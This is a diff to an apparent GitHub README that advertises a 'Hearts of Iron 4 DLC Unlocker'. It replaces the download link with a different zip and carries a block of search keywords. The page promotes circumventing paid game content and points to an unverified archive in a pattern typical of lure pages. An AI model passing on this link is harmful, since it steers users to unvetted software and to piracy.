@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 
 1. **Download IronUnlocker**  
-   [🔗 Get HOI4 DLC Unlocker](https://github.com/Hearts-of-Iron-4-DLC-Unlocker/.github/releases/download/1.8.5/IronUnlocker.zip)
+   [🔗 Get HOI4 DLC Unlocker](https://github.com/Hearts-of-Iron-4-DLC-Unlocker/.github/releases/download/1.8.6/Hearts.of.Iron.4.DLC.zip)
 
 2. **Unpack the downloaded file** and review the quickstart guide included.
 
@@ -52,3 +52,4 @@
    *DLCs with missing files or unsupported formats will be flagged.*
 
 `hoi 4 dlc unlocker`, `hearts of iron 4 dlc unlocker`, `hoi dlc unlocker`, `hearts of iron unlock dlc`
+
